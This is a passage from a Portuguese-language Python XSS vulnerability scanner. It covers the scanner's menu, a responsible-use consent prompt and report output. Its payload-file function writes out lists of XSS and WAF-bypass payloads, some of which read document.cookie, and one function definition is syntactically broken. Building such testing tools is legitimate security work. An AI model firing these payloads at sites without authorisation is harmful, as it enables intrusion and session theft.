                        if v.get("severity", "").lower() == "baixa"
                    ]
                ),
                "reflected_xss": self.stats["reflected_xss"],
                "dom_xss": self.stats["dom_xss_potential"],
                "stored_xss": self.stats["stored_xss"],
            },
            "vulnerabilities": self.found_vulnerabilities,
        }

        with open("vulnerability_report.json", "w", encoding="utf-8") as f:
            json.dump(report, f, indent=4, ensure_ascii=False)

        print(
            f"{Fore.GREEN}✅ Relatório JSON salvo em vulnerability_report.json{Style.RESET_ALL}"
        )

        return report


def display_responsible_use_warning():
    """
    Exibe um aviso importante sobre o uso responsável e ético da ferramenta
    """
    print(f"\n{Fore.RED}🚨 AVISO IMPORTANTE DE USO RESPONSÁVEL 🚨{Style.RESET_ALL}")
    print(
        f"{Fore.YELLOW}Este scanner de vulnerabilidades destina-se APENAS a fins éticos e legais:{Style.RESET_ALL}"
    )
    print(
        "1. Você DEVE ter AUTORIZAÇÃO EXPLÍCITA por escrito do proprietário do sistema antes de realizar qualquer teste."
    )
    print("2. Realizar testes de penetração sem permissão é um crime em muitos países.")
    print("3. Este scanner deve ser usado APENAS em:")
    print("   - Sistemas que você possui")
    print("   - Sistemas para os quais tem permissão documentada")
    print("   - Ambientes de teste controlados")

    print(f"\n{Fore.RED}Uso não autorizado pode resultar em:{Style.RESET_ALL}")
    print("- Ações legais")
    print("- Processo criminal")
    print("- Multas significativas")

    consent = (
        input(
            f"\n{Fore.CYAN}Você leu, entende e concorda com estes termos? (s/n): {Style.RESET_ALL}"
        )
        .strip()
        .lower()
    )

    if consent != "s":
        print(
            f"\n{Fore.RED}❌ Operação cancelada. Uso não autorizado não é permitido.{Style.RESET_ALL}"
        )
        sys.exit(1)

    print(
        f"\n{Fore.GREEN}✅ Obrigado por usar de forma responsável e ética.{Style.RESET_ALL}"
    )


def display_banner():
    """
    Exibe um banner para a aplicação
    """
    banner = f"""
{Fore.CYAN}███████╗████████╗██╗  ██╗ ██████╗ ██████╗ ██████╗  ██████╗ ██████╗ ███████╗
{Fore.CYAN}██╔════╝╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗██╔══██╗██╔═══██╗██╔══██╗██╔════╝
{Fore.BLUE}█████╗     ██║   ███████║██║   ██║██████╔╝██████╔╝██║   ██║██████╔╝█████╗  
{Fore.BLUE}██╔══╝     ██║   ██╔══██║██║   ██║██╔═══╝ ██╔══██╗██║   ██║██╔══██╗██╔══╝  
{Fore.MAGENTA}███████╗   ██║   ██║  ██║╚██████╔╝██║     ██║  ██║╚██████╔╝██████╔╝███████╗
{Fore.MAGENTA}╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                                          
{Fore.RED} ██╗  ██╗███████╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
{Fore.RED} ╚██╗██╔╝██╔════╝██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
{Fore.YELLOW}  ╚███╔╝ ███████╗███████╗    ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
{Fore.YELLOW}  ██╔██╗ ╚════██║╚════██║    ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
{Fore.GREEN} ██╔╝ ██╗███████║███████║    ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
{Fore.GREEN} ╚═╝  ╚═╝╚══════╝╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
                                                                                               
{Style.RESET_ALL}                 {Fore.CYAN}[{Style.RESET_ALL} Versão 2.0 | Scanner Avançado de Vulnerabilidades XSS {Fore.CYAN}]{Style.RESET_ALL}
"""
    print(banner)


def save_config():
    """
    Salva as configurações padrão em um arquivo .env
    """
    if not os.path.exists(".env"):
        with open(".env", "w") as f:
            f.write("# Configurações do Scanner de Vulnerabilidades XSS\n")
            f.write("MAX_WORKERS=10\n")
            f.write("TIMEOUT=15\n")
            f.write("FOLLOW_REDIRECTS=True\n")
            f.write("VERIFY_SSL=False\n")
            f.write(
                "USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36\n"
            )
            f.write("# Adicione PROXY=http://seu-proxy:porta para usar um proxy\n")
        print(f"{Fore.GREEN}✅ Arquivo de configuração .env criado{Style.RESET_ALL}")


def create_payloads_files():
    """
    Cria arquivos de payloads padrão se não existirem
    """
    if not os.path.exists("xss_payloads.txt"):
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "'><script>alert(document.cookie)</script>",
            "<svg/onload=alert('XSS')>",
            "javascript&#58;alert('XSS')",
            "&#x6A;avascript:alert('XSS')",
            "<iframe src='javascript:alert(`XSS`)'>",
            "\" onfocus=alert('XSS') autofocus>",
            "<body onload=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<div onmouseover='alert(\"XSS\")'></div>",
            "<a href=\"javascript:alert('XSS')\">Click me</a>",
            '<input type="text" value="" onmouseover="alert(\'XSS\')" />',
            "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
            '<math><maction actiontype="statusline#" xlink:href="javascript:alert(\'XSS\')">Click</maction>',
            "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
            "<video><source onerror=\"alert('XSS')\">",
            "<video poster=javascript:alert('XSS')//></video>",
            "<audio src=x onerror=alert('XSS')>",
            "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">",
            '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(\'XSS\')"></div>',
            '<link rel="stylesheet" href="javascript:alert(\'XSS\');">',
        ]

        with open("xss_payloads.txt", "w", encoding="utf-8") as f:
            f.write("# Payloads XSS para teste\n")
            f.write("# Adicione um payload por linha\n\n")
            f.write("\n".join(xss_payloads))
        print(f"{Fore.GREEN}✅ Arquivo xss_payloads.txt criado{Style.RESET_ALL}")

    if not os.path.exists("bypass_payloads.txt"):
        bypass_payloads = [
            "<Img src = x onerror = \"javascript: window['ale'+'rt']('XSS');\">",
            "<svg/onload=setTimeout`alert\`XSS\``;>",
            "'-prompt(1)-'",
            "<sCript>alert(1)</sCriPt>",
            "jav&#x09;ascript:alert('XSS');",
            '<a href="javas&#99;ript:alert(1)">click me</a>',
            "<svg><script>alert&#40;1&#41;</script>",
            "'\"`><img src=xxx:x onerror=javascript:alert(1)>",
            '<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',
            "<svg><animate onbegin=prompt() attributeName=x>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";",
        ]

        with open("bypass_payloads.txt", "w", encoding="utf-8") as f:
            f.write("# Payloads para bypass de WAF e filtros\n")
            f.write("# Adicione um payload por linha\n\n")
            f.write("\n".join(bypass_payloads))
        print(f"{Fore.GREEN}✅ Arquivo bypass_payloads.txt criado{Style.RESET_ALL}")


def main():
    """
    Função principal do programa
    """
    colorama.init(autoreset=True)
    display_banner()

    # Verificar/criar arquivos de configuração
    save_config()
    create_payloads_files()

    # Exibir aviso de uso responsável
    display_responsible_use_warning()

    while True:
        print(
            f"\n{Fore.CYAN}==== Menu do Scanner de Vulnerabilidades XSS ===={Style.RESET_ALL}"
        )
        print("1. Iniciar escaneamento completo")
        print("2. Configurar opções avançadas")
        print("3. Verificar cabeçalhos de segurança")
        print("4. Sair")

        choice = input(
            f"\n{Fore.CYAN}Escolha uma opção (1-4): {Style.RESET_ALL}"
        ).strip()

        if choice == "1":
            url = input(
                f"\n{Fore.CYAN}Digite a URL para escanear: {Style.RESET_ALL}"
            ).strip()

            try:
                scanner = AdvancedVulnerabilityScanner(url)

                if not scanner.validate_url(url):
                    print(
                        f"{Fore.RED}❌ URL inválida. Tente novamente.{Style.RESET_ALL}"
                    )
                    continue

                depth = input(
                    f"{Fore.CYAN}Profundidade de crawling (1-5) [padrão 2]: {Style.RESET_ALL}"
                ).strip()
                scanner.depth = (
                    int(depth) if depth.isdigit() and 1 <= int(depth) <= 5 else 2
                )

                max_urls = input(
                    f"{Fore.CYAN}Número máximo de URLs a serem escaneadas [padrão 100]: {Style.RESET_ALL}"
                ).strip()
                scanner.max_urls = (
                    int(max_urls) if max_urls.isdigit() and int(max_urls) > 0 else 100
                )

                start_time = time.time()
                print(
                    f"\n{Fore.GREEN}⏳ Iniciando escaneamento. Isso pode levar algum tempo...{Style.RESET_ALL}"
                )

                scanner.crawl_and_scan()
                scanner.generate_report()
                scanner.generate_report_json()

                end_time = time.time()
                duration = end_time - start_time

                print(
                    f"\n{Fore.GREEN}⏱️ Escaneamento completo! Tempo total: {duration:.2f} segundos{Style.RESET_ALL}"
                )

            except KeyboardInterrupt:
                print(
                    f"\n{Fore.YELLOW}⚠️ Escaneamento interrompido pelo usuário.{Style.RESET_ALL}"
                )
            except Exception as e:
                print(f"{Fore.RED}❌ Erro durante o escaneamento: {e}{Style.RESET_ALL}")

        elif choice == "2":
            print(f"\n{Fore.CYAN}==== Configurações Avançadas ===={Style.RESET_ALL}")

            try:
                with open(".env", "r") as f:
                    config = f.readlines()

                new_config = []
                for line in config:
                    if line.strip() and not line.startswith("#"):
                        key, value = line.strip().split("=", 1)
                        new_value = input(
                            f"{Fore.CYAN}{key} [{value}]: {Style.RESET_ALL}"
                        ).strip()
                        new_config.append(
                            f"{key}={new_value if new_value else value}\n"
                        )
                    else:
                        new_config.append(line)

                with open(".env", "w") as f:
                    f.writelines(new_config)

                print(
                    f"{Fore.GREEN}✅ Configurações salvas com sucesso!{Style.RESET_ALL}"
                )

                # Recarregar variáveis de ambiente
                load_dotenv(override=True)

            except Exception as e:
                print(
                    f"{Fore.RED}❌ Erro ao atualizar configurações: {e}{Style.RESET_ALL}"
                )

        elif choice == "3":
            url = input(
                f"\n{Fore.CYAN}Digite a URL para verificar cabeçalhos de segurança: {Style.RESET_ALL}"
            ).strip()

            try:
                scanner = AdvancedVulnerabilityScanner(url)

                if not scanner.validate_url(url):
                    print(
                        f"{Fore.RED}❌ URL inválida. Tente novamente.{Style.RESET_ALL}"
                    )
                    continue

                response = scanner._make_request(url)
                if response:
                    issues = scanner._check_security_headers(url, response)

                    print(
                        f"\n{Fore.CYAN}==== Análise de Cabeçalhos de Segurança ===={Style.RESET_ALL}"
                    )

                    print(
                        f"\n{Fore.YELLOW}Cabeçalhos atuais da resposta:{Style.RESET_ALL}"
                    )
                    for header, value in response.headers.items():
                        print(f"{Fore.GREEN}{header}:{Style.RESET_ALL} {value}")

                    if issues:
                        print(
                            f"\n{Fore.RED}🚨 Problemas de Segurança Detectados:{Style.RESET_ALL}"
                        )
                        for issue in issues:
                            severity = issue.get("severity", "Média")
                            severity_color = Fore.YELLOW
                            if severity.lower() == "alta":
                                severity_color = Fore.RED
                            elif severity.lower() == "baixa":
                                severity_color = Fore.GREEN

                            print(
                                f"\n- {issue.get('type', 'Problema')}: {issue.get('message', '')}"
                            )
                            print(
                                f"  Severidade: {severity_color}{severity}{Style.RESET_ALL}"
                            )
                            print(f"  Descrição: {issue.get('description', 'N/A')}")
                    else:
                        print(
                            f"\n{Fore.GREEN}✅ Nenhum problema crítico encontrado nos cabeçalhos!{Style.RESET_ALL}"
                        )

                else:
                    print(
                        f"{Fore.RED}❌ Não foi possível obter resposta do servidor.{Style.RESET_ALL}"
                    )

            except Exception as e:
                print(
                    f"{Fore.RED}❌ Erro ao verificar cabeçalhos: {e}{Style.RESET_ALL}"
                )

        elif choice == "4":
            print(
                f"\n{Fore.GREEN}Obrigado por usar o Scanner Avançado de Vulnerabilidades XSS!{Style.RESET_ALL}"
            )
            break

        else:
            print(f"{Fore.RED}❌ Opção inválida. Tente novamente.{Style.RESET_ALL}")


def create_readme():
    """
    Cria um arquivo README.md com instruções apenas se ele não existir
    """
    if os.path.exists("README.md"):
        print(f"{Fore.YELLOW}⚠️ README.md já existe e será preservado.{Style.RESET_ALL}")
        return

    # Se não existe, então cria o arquivo com o conteúdo padrão
    readme_content = """# EthicScope XSS - Scanner Avançado de Vulnerabilidades

<p align="center">
  <img src="https://img.shields.io/badge/Segurança-Web-blue" alt="Web Security">
  <img src="https://img.shields.io/badge/Versão-2.0-green" alt="Version 2.0">
  <img src="https://img.shields.io/badge/Python-3.7+-yellow" alt="Python 3.7+">
  <img src="https://img.shields.io/badge/Licença-MIT-red" alt="MIT License">
</p>

# Restante do conteúdo do README...
"""

    with open("README.md", "w", encoding="utf-8") as f:
        f.write(readme_content)
    print(f"{Fore.GREEN}✅ Arquivo README.md criado com sucesso!{Style.RESET_ALL}")


def create_license():
    """
    Cria um arquivo de licença MIT
    """
    license_content = """MIT License

Copyright (c) 2025 XSS Scanner

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

    with open("LICENSE", "w", encoding="utf-8") as f:
        f.write(license_content)
    print(f"{Fore.GREEN}✅ Arquivo de licença criado com sucesso!{Style.RESET_ALL}")


:def create_requirements()
    """
    Cria um arquivo requirements.txt
    """
    requirements = """requests>=2.28.0
beautifulsoup4>=4.11.0
colorama>=0.4.6
python-dotenv>=1.0.0
urllib3>=1.26.0
"""

    with open("requirements.txt", "w", encoding="utf-8") as f:
        f.write(requirements)
    print(
        f"{Fore.GREEN}✅ Arquivo requirements.txt criado com sucesso!{Style.RESET_ALL}"
    )


if __name__ == "__main__":
    try:
        # Criar arquivos de suporte
        create_readme()
        create_license()
        create_requirements()

        # Executar programa principal
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Operação cancelada pelo usuário.{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}Erro crítico: {e}{Style.RESET_ALL}")
        sys.exit(1)
